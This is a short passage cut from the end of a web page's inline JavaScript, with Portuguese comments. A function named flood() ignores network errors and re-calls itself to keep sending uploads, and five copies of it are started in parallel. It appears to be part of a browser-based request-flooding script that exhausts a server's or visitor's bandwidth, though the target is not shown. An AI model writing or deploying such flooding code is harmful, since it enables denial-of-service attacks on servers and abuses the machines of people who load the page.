            // Ignora erro de rede, foca no envio
            flood(); 
        });
    }
    
    // Inicia 5 threads paralelas de upload
    for(var i=0; i<5; i++) flood();
}
</script>
</body>
</html>
